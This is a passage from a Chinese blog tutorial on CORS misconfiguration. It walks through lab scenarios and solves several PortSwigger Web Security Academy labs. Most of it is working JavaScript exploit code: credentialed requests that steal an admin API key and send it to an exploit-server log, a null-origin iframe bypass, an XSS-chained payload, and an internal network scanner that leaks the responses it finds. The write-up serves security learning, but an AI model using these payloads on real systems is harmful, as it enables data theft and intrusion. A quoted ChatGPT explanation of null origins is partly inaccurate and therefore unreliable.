的方式去检测该漏洞是否存在。<br><br>#### 场景一：信任任意 <span class="hljs-title class_">Origin</span> 源<br><br>应用程序接受来自任何 <span class="hljs-title class_">Origin</span> 的 <span class="hljs-variable constant_">CORS</span> 请求。该代码将 <span class="hljs-title class_">Origin</span> 值放在 <span class="hljs-variable constant_">HTTP</span> 响应头 <span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Origin</span> 中。现在，此配置将允许来自任何 <span class="hljs-title class_">Origin</span> 的任何脚本向应用程序发出 <span class="hljs-variable constant_">CORS</span> 请求。<span class="hljs-title class_">Web</span> 浏览器将执行标准的 <span class="hljs-variable constant_">CORS</span> 请求检查，来自恶意域的脚本将能够窃取数据。<br><br>应用程序接受 <span class="hljs-title class_">Origin</span> 标头中指定的任何值。<br>![image-<span class="hljs-number">20230510215219591</span>](<span class="hljs-variable constant_">CORS</span>跨域漏洞/image-<span class="hljs-number">20230510215219591.</span>png)<br><br>可以看到箭头处的域名,是任意的,而该网站都允许域名发出请求并回显(origin处是我自己添加的)<br><br>#### 场景二：正则表达式检测 <span class="hljs-title class_">Origin</span> 源<br><br>应用程序已实施 <span class="hljs-variable constant_">CORS</span> 策略并对列入白名单的域/子域执行“正则表达式”检查。在这种情况下，应用程序在代码中具有弱正则表达式实现，它只检查 <span class="hljs-variable constant_">HTTP</span> 请求 <span class="hljs-title class_">Origin</span> 标头中任何位置的域名 b0x.<span class="hljs-property">com</span> 的存在。如果 <span class="hljs-variable constant_">HTTP</span> 标头 <span class="hljs-title class_">Origin</span> 的值为 inb0x.<span class="hljs-property">com</span> 或 b0x.<span class="hljs-property">comlab</span>.<span class="hljs-property">com</span>，正则表达式会将其标记为通过。这种错误配置将导致跨源共享数据。<br><br>**应用程序信任列入白名单的 <span class="hljs-title class_">Origin</span>。**<br>![image-<span class="hljs-number">20230510215728867</span>](<span class="hljs-variable constant_">CORS</span>跨域漏洞/image-<span class="hljs-number">20230510215728867.</span>png)<br><br>**应用程序不允许任何任意来源, 可以看到下图右侧没有<span class="hljs-variable constant_">CORS</span>头**<br><br>![image-<span class="hljs-number">20230510215801410</span>](<span class="hljs-variable constant_">CORS</span>跨域漏洞/image-<span class="hljs-number">20230510215801410.</span>png)<br><br>应用程序弱正则表达式允许在域名开头具有白名单域字符串的 <span class="hljs-title class_">Origin</span>。<br><br>![image-<span class="hljs-number">20230510215958783</span>](<span class="hljs-variable constant_">CORS</span>跨域漏洞/image-<span class="hljs-number">20230510215958783.</span>png)<br><br>应用程序弱正则表达式允许在域名末尾具有白名单域字符串的 <span class="hljs-title class_">Origin</span>。<br><br>![image-<span class="hljs-number">20230510220029500</span>](<span class="hljs-variable constant_">CORS</span>跨域漏洞/image-<span class="hljs-number">20230510220029500.</span>png)<br><br>#### 场景三：信任<span class="hljs-literal">null</span>源<br><br>在这种情况下，应用程序 <span class="hljs-variable constant_">HTTP</span> 响应标头 <span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>-<span class="hljs-title class_">Origin</span> 始终设置为 <span class="hljs-literal">null</span>。当用户指定 <span class="hljs-literal">null</span> 以外的任何值时，应用程序不会处理它并在 <span class="hljs-variable constant_">HTTP</span> 响应中继续反映 <span class="hljs-literal">null</span> 。允许攻击者执行漏洞利用的技巧很少，并且可以使用 <span class="hljs-variable constant_">CORS</span> 请求过滤受害者的数据。<br><br>**应用程序接受 <span class="hljs-title class_">Origin</span> 标头中指定的 <span class="hljs-literal">null</span> 值。**<br><br>![image-<span class="hljs-number">20230510220243338</span>](<span class="hljs-variable constant_">CORS</span>跨域漏洞/image-<span class="hljs-number">20230510220243338.</span>png)<br><br>#### 注意事项<br><br>如果响应包 <span class="hljs-title class_">Header</span> 中为以下情况 ，则不存在漏洞。<br><br><span class="hljs-string">``</span><span class="hljs-string">`</span><br><span class="hljs-string">Access-Control-Allow-Origin: *</span><br><span class="hljs-string">Access-Control-Allow-Credentials:true</span><br><span class="hljs-string">`</span><span class="hljs-string">``</span><br><br>![image-<span class="hljs-number">20230510220310783</span>](<span class="hljs-variable constant_">CORS</span>跨域漏洞/image-<span class="hljs-number">20230510220310783.</span>png)<br><br>原因是因为浏览器会对此类情况的请求进行自动拦截，不具备漏洞利用条件。<br><br>在 <span class="hljs-variable constant_">CORS</span>-vulnerable-<span class="hljs-title class_">Lab</span> 靶场的 <span class="hljs-title class_">POCs</span> 目录下，有 <span class="hljs-variable constant_">CORS</span> 漏洞利用的脚本<br><br>以 <span class="hljs-string">`arbitrary_origin_exploit.html`</span> 为例，用文本编辑器打开该脚本文件，找到如下代码并根据实际应用场景进行修改<br><br><span class="hljs-string">``</span><span class="hljs-string">``</span>js<br>&lt;script&gt;<br><span class="hljs-comment">//向目标应用程序网页发出 CORS 请求以获取 HTTP 响应的函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params"></span>) &#123;<br> <span class="hljs-keyword">var</span> xhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br> xhttp.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">readyState</span> == <span class="hljs-number">4</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">status</span> == <span class="hljs-number">200</span>) &#123;<br>     <span class="hljs-keyword">var</span> all = <span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>;<br>     <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;load&quot;</span>).<span class="hljs-property">innerHTML</span>= all; <span class="hljs-comment">// 分割打印被盗取的 HTTP 响应</span><br>     <br>      &#125;<br> &#125;;<br> xhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://192.168.126.6/CORS/arbitrary_origin.php&quot;</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">//将 URL 更改为错误配置 CORS 策略的 URL</span><br> xhttp.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Accept&quot;</span>, <span class="hljs-string">&quot;text\/html,application\/xhtml+xml,application\/xml;q=0.9,\/;q=0.8&quot;</span>);<br> xhttp.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Accept-Language&quot;</span>, <span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>);<br> xhttp.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>;<br> xhttp.<span class="hljs-title function_">send</span>();<br>&#125;<br><br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
</li>
</ol>
<p>将利用脚本放置在搭建的恶意网站下，当受害者在同一浏览器登录目标网站，并打开该恶意链接，即可盗取目标网站的 HTTP 响应内容。</p>
<p class='item-img' data-src='image-20230510221238392.png'><img src="image-20230510221238392.png" alt="image-20230510221238392"></p>
<p>这里我复现不出来…</p>
<h2 id="0x12-bp官网的靶场练习"><a href="#0x12-bp官网的靶场练习" class="headerlink" title="0x12-bp官网的靶场练习"></a>0x12 bp官网的靶场练习</h2>
<h4 id="实验一-具有基本原点反射的-CORS-漏洞"><a href="#实验一-具有基本原点反射的-CORS-漏洞" class="headerlink" title="实验一-具有基本原点反射的-CORS-漏洞"></a>实验一: 具有基本原点反射的 CORS 漏洞</h4>
<p>信息:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">该网站具有不安全的CORS配置，因为它信任所有来源。<br><br>要解决该实验室问题，请编写一些使用 CORS 检索管理员 API 密钥并将代码上传到漏洞利用服务器的 JavaScript。当您成功提交管理员的 API 密钥时，该实验就解决了。<br><br>您可以使用以下凭据登录到您自己的帐户：wiener:peter<br></code></pre></td></tr></table></figure>
<p>首先开启bp代理,同时关闭拦截,记录你浏览网页的请求</p>
<p class='item-img' data-src='image-20230511001645031.png'><img src="image-20230511001645031.png" alt="image-20230511001645031"></p>
<p>登陆账号，查看历史记录并观察到密钥是通过AJAX请求/accountDetails检索的，并且响应包含Access-Control-Allow-Credentials标头，表明它可能支持CORS</p>
<p class='item-img' data-src='image-20230511235451763.png'><img src="image-20230511235451763.png" alt="image-20230511235451763"></p>
<p>接下来我们将其发送到重发器,验证是否有CORS漏洞</p>
<p class='item-img' data-src='image-20230512000128545.png'><img src="image-20230512000128545.png" alt="image-20230512000128545"></p>
<p>如上图我们在请求区添加origin头,并写入随意的一个域名,响应后发现右侧的CORS头出现我们输入的域名(不论我们的域名是什么),这说明的确存在CORS漏洞, 即允许任意源的访问</p>
<p>接下来我们要编写js脚本,意在向服务器发送获取管理员详细信息的请求(这里是cookie),并将请求得到的数据存放在我们的日志中</p>
<p><a target="_blank" rel="noopener" href="https://0ac200c803b3121486c4a98700c50006">https://0ac200c803b3121486c4a98700c50006</a>: 此处换成你实验室的url即可</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>    <span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>    req.<span class="hljs-property">onload</span> = reqListener;<br>    req.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;https://0ac200c803b3121486c4a98700c50006.web-security-academy.net/accountDetails&#x27;</span>,<span class="hljs-literal">true</span>);<br>    req.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>;<br>    req.<span class="hljs-title function_">send</span>();<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">reqListener</span>(<span class="hljs-params"></span>) &#123;<br>        location=<span class="hljs-string">&#x27;/log?key=&#x27;</span>+<span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>;<br>    &#125;;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p>接着将该脚本添加到漏洞服务器中(发送给受害者),查看你的日志,如下图可以看到成功得到管理员的apikey</p>
<p class='item-img' data-src='image-20230512001443189.png'><img src="image-20230512001443189.png" alt="image-20230512001443189"></p>
<p class='item-img' data-src='image-20230512001856272.png'><img src="image-20230512001856272.png" alt="image-20230512001856272"></p>
<p>如上图,从左到右依次点击即可</p>
<h4 id="实验室二：受信任空源的CORS漏洞"><a href="#实验室二：受信任空源的CORS漏洞" class="headerlink" title="实验室二：受信任空源的CORS漏洞"></a>实验室二：受信任空源的CORS漏洞</h4>
<p>提示:</p>
<p>这个网站有一个不安全的<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cors">CORS</a>配置，因为它信任“null”来源。</p>
<p>为了解决这个实验，编写一些JavaScript，使用CORS检索管理员的API密钥并将代码上传到漏洞利用服务器。当您成功提交管理员的API密钥时，该实验就解决了.<br>
您可以使用以下凭据登录到自己的帐户：<code>wiener:peter</code></p>
<p>同上题</p>
<p>登陆账号，单击&quot;我的帐户&quot;，查看历史记录并观察到密钥是通过AJAX请求/accountDetails检索的，并且响应包含Access-Control-Allow-Credentials标头，表明它可能支持CORS</p>
<p class='item-img' data-src='image-20230512002701301.png'><img src="image-20230512002701301.png" alt="image-20230512002701301"></p>
<p>经过实验发现,这次不能允许任意源的访问了,那我们给origin赋值为null看看响应,发现成功响应</p>
<p class='item-img' data-src='image-20230512003016726.png'><img src="image-20230512003016726.png" alt="image-20230512003016726"></p>
<p>接着用iframe构造null源的请求来绕过</p>
<p>在浏览器中，转到漏洞利用服务器并输入以下HTML（将YOUR-LAB-ID替换为实验室URL的URL，将YOUR-EXPLOIT-SERVER-ID替换为漏洞利用服务器ID）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;iframe sandbox=<span class="hljs-string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> srcdoc=<span class="hljs-string">&quot;&lt;script&gt;</span><br><span class="hljs-string">    var req = new XMLHttpRequest();</span><br><span class="hljs-string">    req.onload = reqListener;</span><br><span class="hljs-string">    req.open(&#x27;get&#x27;,&#x27;YOUR-LAB-ID.web-security-academy.net/accountDetails&#x27;,true);</span><br><span class="hljs-string">    req.withCredentials = true;</span><br><span class="hljs-string">    req.send();</span><br><span class="hljs-string">    function reqListener() &#123;</span><br><span class="hljs-string">        location=&#x27;YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=&#x27;+encodeURIComponent(this.responseText);</span><br><span class="hljs-string">    &#125;;</span><br><span class="hljs-string">&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;<br> <br>我的是：<br>&lt;iframe sandbox=<span class="hljs-string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> srcdoc=<span class="hljs-string">&quot;&lt;script&gt;</span><br><span class="hljs-string">    var req = new XMLHttpRequest();</span><br><span class="hljs-string">    req.onload = reqListener;</span><br><span class="hljs-string">    req.open(&#x27;get&#x27;,&#x27;https://0a3100d803693dd6813ff78900520003.web-security-academy.net/accountDetails&#x27;,true);</span><br><span class="hljs-string">    req.withCredentials = true;</span><br><span class="hljs-string">    req.send();</span><br><span class="hljs-string">    function reqListener() &#123;</span><br><span class="hljs-string">        location=&#x27;https://exploit-0a8900c2034a3d9a8119f65d01ab00f8.exploit-server.net/log?key=&#x27;+encodeURIComponent(this.responseText);</span><br><span class="hljs-string">    &#125;;</span><br><span class="hljs-string">&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;	<br></code></pre></td></tr></table></figure>
<p>注意iframe沙箱的使用，因为这会生成一个空的源请求。</p>
<p>原因如下：GPT回答</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">这里iframe沙箱为何会产生一个空的源请求？<br><br>//ChatGPT<br>在给定的代码中，使用了一个具有沙箱属性的 &lt;iframe&gt; 元素，它的 sandbox 属性被设置为 &quot;allow-scripts allow-top-navigation allow-forms&quot;。这些属性指定了一组沙箱规则，用于限制嵌入的文档的行为。<br><br>其中，allow-scripts 属性允许嵌入的文档执行脚本，allow-top-navigation 属性允许嵌入的文档导航到顶级窗口，allow-forms 属性允许嵌入的文档提交表单。<br><br>**当使用具有沙箱属性的 &lt;iframe&gt; 元素时，如果没有指定 src 属性，则会执行 srcdoc 属性的内容作为内联文档。在这种情况下，内联文档的源被视为一个空字符串。**<br><br>由于源被视为一个空字符串，因此在发出请求时，浏览器会创建一个空的初始请求，因为没有指定具体的源。这个初始请求不会导致真正的网络请求，也不会发送到服务器。因此，你观察到的是一个空的源请求。<br><br>需要注意的是，沙箱属性可以提供一定的安全性，但它仍然需要在合适的场景和正确的使用方式下才能发挥作用。开发者应该仔细考虑并评估是否需要使用沙箱以及如何设置沙箱属性，以确保安全性和功能之间的平衡。<br></code></pre></td></tr></table></figure>
<p>单击&quot;查看漏洞利用&quot;（view）。观察漏洞利用是否有效-已登录到日志页面，API密钥位于URL中（测试poc的可行性，就不在这测了，直接到发给受害者）<br>
返回到利用漏洞攻击服务器并单击&quot;将利用漏洞攻击发送给受害者&quot;。</p>
<p class='item-img' data-src='image-20230512003338078.png'><img src="image-20230512003338078.png" alt="image-20230512003338078"></p>
<p class='item-img' data-src='image-20230512003939772.png'><img src="image-20230512003939772.png" alt="image-20230512003939772"></p>
<p>成功!!!</p>
<h4 id="实验三-受信任的不安全协议的CORS漏洞"><a href="#实验三-受信任的不安全协议的CORS漏洞" class="headerlink" title="实验三-受信任的不安全协议的CORS漏洞"></a>实验三:  受信任的不安全协议的CORS漏洞</h4>
<p>提示:</p>
<p>1、此网站具有不安全的CORS配置，因为它信任所有子域，而不管协议如何。</p>
<p>2、解决实验：编制JavaScript，使用CORS检索管理员的API密钥并将代码上载到漏洞利用服务器。并提交api key</p>
<p>3、已有账号：wiener:peter</p>
<p class='item-img' data-src='image-20230512005418526.png'><img src="image-20230512005418526.png" alt="image-20230512005418526"></p>
<p>如上图,依旧可能存在CORS漏洞,发送到重发器验证</p>
<p class='item-img' data-src='image-20230512005502585.png'><img src="image-20230512005502585.png" alt="image-20230512005502585"></p>
<p>此时将origin标头改为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Origin:http://subdomain.lab-id<br>（lab-id 是实验室域名）<br> <br>我的是：<br>Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.net<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230512005624579.png'><img src="image-20230512005624579.png" alt="image-20230512005624579"></p>
<p>如上图成功发现利用漏洞(发现其任意子域都可以访问)</p>
<p><strong>组合利用</strong><br>
打开一个产品页面，单击Check stock并观察它是使用一个子域上的HTTP URL加载的</p>
<p class='item-img' data-src='image-20230512010238048.png'><img src="image-20230512010238048.png" alt="image-20230512010238048"></p>
<p>接下来验证该子域是否存在XSS漏洞,如下图,响应中并没有对我们的恶意代码进行某些必要的编码过滤,因此的确存在XSS漏洞</p>
<p class='item-img' data-src='image-20230512010433282.png'><img src="image-20230512010433282.png" alt="image-20230512010433282"></p>
<p>在浏览器中，转到漏洞利用服务器并输入以下HTML，将YOUR-LAB-ID替换为您的唯一实验室URL，将YOUR-EXPLOIT-SERVER-ID替换为您的漏洞利用服务器ID：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&quot;http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4&lt;script&gt;</span><br><span class="hljs-string">	var req = new XMLHttpRequest(); </span><br><span class="hljs-string">	req.onload = reqListener; </span><br><span class="hljs-string">	req.open(&#x27;get&#x27;,&#x27;https://YOUR-LAB-ID.web-security-academy.net/accountDetails&#x27;,true); </span><br><span class="hljs-string">	req.withCredentials = true;</span><br><span class="hljs-string">	req.send();</span><br><span class="hljs-string">	function reqListener() &#123;</span><br><span class="hljs-string">        location=&#x27;https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=&#x27;%2bthis.responseText;</span><br><span class="hljs-string">    &#125;;%3c/script&gt;&amp;storeId=1&quot;</span><br>&lt;/script&gt;<br> <br>我的是：<br>&lt;script&gt;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&quot;http://stock.0a9800610460650c822b3861005c0050.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open(&#x27;get&#x27;,&#x27;https://0a9800610460650c822b3861005c0050.web-security-academy.net/accountDetails&#x27;,true); req.withCredentials = true;req.send();function reqListener() &#123;location=&#x27;https://exploit-0a6c00a2045f65df82f537b4017f003e.exploit-server.net/log?key=&#x27;%2bthis.responseText; &#125;;%3c/script&gt;&amp;storeId=1&quot;</span><br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20230512011023038.png'><img src="image-20230512011023038.png" alt="image-20230512011023038"></p>
<h4 id="实验四-CORS漏洞与内部网络枢轴攻击"><a href="#实验四-CORS漏洞与内部网络枢轴攻击" class="headerlink" title="实验四-CORS漏洞与内部网络枢轴攻击"></a>实验四: CORS漏洞与内部网络枢轴攻击</h4>
<p>提示:</p>
<p>1、此网站具有不安全的CORS配置，因为它信任所有内部网络来源。</p>
<p>2、完成实验：编制JavaScript来定位本地网络（192.168.0.0/24，端口8080）上的端点，然后使用该端点来识别和创建基于CORS的攻击以删除用户。删除用户<code>Carlos</code>后，实验将得到解决。</p>
<p>part1:</p>
<p>需要扫描本地网络以查找端点。将$collaboratorPayload替换为Collaborator有效负载或漏洞利用服务器URL</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br><span class="hljs-keyword">var</span> q = [], collaboratorURL = <span class="hljs-string">&#x27;http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/&#x27;</span>;<br> <br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">255</span>;i++) &#123;<br>	q.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">url</span>) &#123;<br>		<span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">wait</span>) &#123;<br>			<span class="hljs-title function_">fetchUrl</span>(url, wait);<br>		&#125;<br>	&#125;(<span class="hljs-string">&#x27;http://192.168.0.&#x27;</span>+i+<span class="hljs-string">&#x27;:8080&#x27;</span>));<br>&#125;<br> <br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">20</span>;i++)&#123;<br>	<span class="hljs-keyword">if</span>(q.<span class="hljs-property">length</span>)q.<span class="hljs-title function_">shift</span>()(i*<span class="hljs-number">100</span>);<br>&#125;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUrl</span>(<span class="hljs-params">url, wait</span>) &#123;<br>	<span class="hljs-keyword">var</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>(), signal = controller.<span class="hljs-property">signal</span>;<br>	<span class="hljs-title function_">fetch</span>(url, &#123;signal&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-title function_">text</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> &#123;<br>		location = collaboratorURL + <span class="hljs-string">&#x27;?ip=&#x27;</span>+url.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^http:\/\//</span>,<span class="hljs-string">&#x27;&#x27;</span>)+<span class="hljs-string">&#x27;&amp;code=&#x27;</span>+<span class="hljs-built_in">encodeURIComponent</span>(text)+<span class="hljs-string">&#x27;&amp;&#x27;</span>+<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>	&#125;))<br>	.<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123;<br>		<span class="hljs-keyword">if</span>(q.<span class="hljs-property">length</span>) &#123;<br>			q.<span class="hljs-title function_">shift</span>()(wait);<br>		&#125;<br>	&#125;);<br>	<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> &#123;<br>		controller.<span class="hljs-title function_">abort</span>();<br>		<span class="hljs-keyword">if</span>(q.<span class="hljs-property">length</span>) &#123;<br>			q.<span class="hljs-title function_">shift</span>()(wait);<br>		&#125;<br>	&#125;, wait);<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">上述代码解析：GPT回答<br>解析：<br><br>1.定义了一个空数组 q 用于存储异步请求的队列。<br><br>2.定义了一个 collaboratorURL 变量，指定了协作者的 URL。<br><br>3.使用一个 for 循环从 1 到 255，生成了一系列函数，并将这些函数添加到队列 q 中。每个生成的函数将调用 fetchUrl(url, wait) 函数，并将不同的 IP 地址组合成一个 URL。<br><br>4.使用另一个 for 循环从 1 到 20，不断从队列 q 中取出函数，并调用它们，传递不同的等待时间参数。<br><br>5.定义了一个 fetchUrl(url, wait) 函数，用于发起异步请求。<br><br>6.创建了一个 AbortController 对象和对应的 signal 信号。<br><br>7.使用 fetch 函数发送一个 GET 请求到指定的 URL，并指定 signal 作为参数传递给请求选项。<br><br>8.当请求成功返回时，将响应的文本内容作为参数拼接到指定的协作者 URL，并进行重定向。<br><br>9.如果请求失败，则判断队列 q 是否还有剩余的函数，如果有，则取出下一个函数并执行。<br><br>10.使用 setTimeout 设置一个超时定时器，当超时时，终止请求并执行与上述相同的处理逻辑。<br><br>这段代码的目的是通过循环异步请求来尝试访问本地网络中的 HTTP 服务，并将响应的文本内容发送到协作者的服务器。<br></code></pre></td></tr></table></figure>
<p>在漏洞利用服务器中输入以下代码。单击存储，然后单击“将漏洞利用发送给受害者”。</p>
<p class='item-img' data-src='image-20230512092320370.png'><img src="image-20230512092320370.png" alt="image-20230512092320370"></p>
<p>检查日志或Collaborator交互组件，并查看发送给它的代码参数</p>
<p class='item-img' data-src='image-20230512092341858.png'><img src="image-20230512092341858.png" alt="image-20230512092341858"></p>
<p>发现: 192.168.0.175:8080</p>
<p>part2:</p>
<p>重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为从协作者交互中检索到的IP地址和端口号。不要忘记添加Collaborator有效负载或再次利用服务器URL。更新并提供漏洞利用。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">xss</span>(<span class="hljs-params">url, text, vector</span>) &#123;<br>	location = url + <span class="hljs-string">&#x27;/login?time=&#x27;</span>+<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()+<span class="hljs-string">&#x27;&amp;username=&#x27;</span>+<span class="hljs-built_in">encodeURIComponent</span>(vector)+<span class="hljs-string">&#x27;&amp;password=test&amp;csrf=&#x27;</span>+text.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/csrf&quot; value=&quot;([^&quot;]+)&quot;/</span>)[<span class="hljs-number">1</span>];<br>&#125;<br> <br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUrl</span>(<span class="hljs-params">url, collaboratorURL</span>)&#123;<br>	<span class="hljs-title function_">fetch</span>(url).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-title function_">text</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> &#123;<br>		<span class="hljs-title function_">xss</span>(url, text, <span class="hljs-string">&#x27;&quot;&gt;&lt;img src=&#x27;</span>+collaboratorURL+<span class="hljs-string">&#x27;?foundXSS=1&gt;&#x27;</span>);<br>	&#125;))<br>&#125;<br> <br><span class="hljs-title function_">fetchUrl</span>(<span class="hljs-string">&quot;http://192.168.0.175:8080&quot;</span>, <span class="hljs-string">&quot;http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/&quot;</span>);<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
